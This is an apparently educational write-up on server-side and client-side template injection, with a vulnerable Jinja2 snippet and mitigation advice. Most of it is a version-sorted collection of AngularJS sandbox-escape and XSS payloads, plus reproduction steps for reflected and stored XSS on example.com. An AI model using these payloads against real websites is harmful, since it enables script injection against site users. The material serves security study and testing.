**`Server-Side Template Injection (SSTI)`**

Server-Side Template Injection (SSTI) is a vulnerability that occurs when an attacker can inject arbitrary code into a server-side template, leading to its execution on the server. This vulnerability is commonly found in web applications that use templates to render dynamic content.

**Here's an example scenario to illustrate how SSTI can be exploited:**

- Let's consider a web application that uses a template engine to display user-supplied content on the website.

- The vulnerable code might look like this (using the Jinja2 template engine syntax as an example):
```
from jinja2 import Template

template = Template(request.form['template'])
output = template.render()
return output
```

- The application accepts user input in the template parameter and directly passes it to the template engine without proper validation or sanitization.

- An attacker discovers this vulnerability and decides to exploit it. They craft a malicious template that contains arbitrary code for execution.

**For example, the attacker could use the following payload:**
```
{{ 7 * 7 }}
```

- When the vulnerable website processes the user's input and renders the template, the payload provided by the attacker is executed as code.

- In this case, the expression 7 * 7 is evaluated, and the result, 49, is displayed on the website.

- However, an attacker could execute more harmful code, such as accessing sensitive information, executing system commands, or even achieving remote code execution on the server.

**SSTI vulnerabilities arise when user-supplied input is directly incorporated into server-side templates without proper sanitization or validation. This allows attackers to inject malicious code that gets executed on the server, leading to various security risks.**

`To mitigate SSTI vulnerabilities, it is crucial to validate and sanitize user input before incorporating it into server-side templates. Avoid executing user input as code directly and consider using a secure template engine that provides built-in context escaping and input sanitization. Additionally, keeping the web application framework and associated libraries up to date is important to receive security patches and avoid known SSTI vulnerabilities.`

---
---

**`Client Side Template Injection (CSTI)`**

**Summary**

When an application permits user-supplied input to be used in a template that is displayed on the client-side, a vulnerability known as Client Side Template Injection (CSTI) arises.

This may result in the execution of arbitrary code inside the boundaries of the compromised application.

**Description**

It is similar to Server Side Template Injection but client-side. Both the SSTI and the CSTI can let you run arbitrary JavaScript code on the victim whereas the SSTI can let you run code on the remote server.

Similar to how SSTI was tested, this vulnerability may be found by having the interpreter execute code that it expects to be between double-keyed characters. If the server is susceptible, for instance, using anything like:

**`{{ 7–7 }}`, you will see a `0`; otherwise, you will see the original: `{{ 7–7 }}`**.

---

**AngularJS**

An AngularJS directive, commonly known as the ng-app attribute, is a common JavaScript library that examines the contents of HTML nodes containing it.

You can run JavaScript expressions within double curly braces when a directive is introduced to the HTML code.

For instance, if your input is mirrored within the HTML body and the body is created with the ng-app syntax: body ng-app>

By including curly braces into the body, you can run any JavaScript code:
```
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

---

**1.3.2 and below**
```
{{7*7}}
```

```
'a'.constructor.fromCharCode=[].join;
'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';
```

```
{{
    'a'.constructor.prototype.charAt=[].join;
    $eval('x=""')+''
}}
```

```
{{
    'a'.constructor.prototype.charAt=[].join;
    $eval('x=alert(1)')+''
}}
```

```
{{constructor.constructor('alert(1)')()}}
```

```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

```
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

```

```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```


```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```


```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```
---

**1.3.3**

As literal object:
```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(Evaluated Object Literal)');}}
```

As Array: 
```{{x = [''.constructor.prototype]; x[0].charAt=[].join; $eval('x=alert(Evaluated Array)');}}
```

**Versions 1.3.0 - 1.5.7:**

```
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
```

**Versions 1.2.20 - 1.2.29:**

```
{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}
```

**Version 1.2.19:**

```
{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}
```

**Versions 1.2.6 - 1.2.18:**

```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**Versions 1.2.0 - 1.2.5:**

```
{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}
```

**SVG**

```
<svg>
  <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
    <circle r="400"></circle>
    <animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" />
  </a>
</svg>
```

**Angular 1.5.9 Jan Horn sandbox escape**

```
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```
**Angular 1.6.0**

---

**Impact**

    Arbitrary code execution
    Information disclosure
    Cross-Site Scripting (XSS)
 ---   

**`Steps To Reproduce`**

**1. CSTI leads to XSS**
   

    Navigate to Go on https://www.example.com/?s=
    
    Add the payload to the parameter

```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(/Mik/)');}}
```

`https://www.ecample.com/?s={{x = {‘y’:’’.constructor.prototype}; x[‘y’].charAt=[].join;$eval(‘x=alert(/Mik/)’);}}`

- XSS executed {F429434}

**2. Stored XSS via AngularJS Injection**

- Create an account on example.com
- Visit https://test.example.com/messages/referrals/contacts/
- Add a new contact
- In the address field, enter [[constructor.constructor('alert(1)')()]]
- XSS executed

**Recommendations**

   1. Input validation and sanitization
   2. Context-aware output encoding

---
   
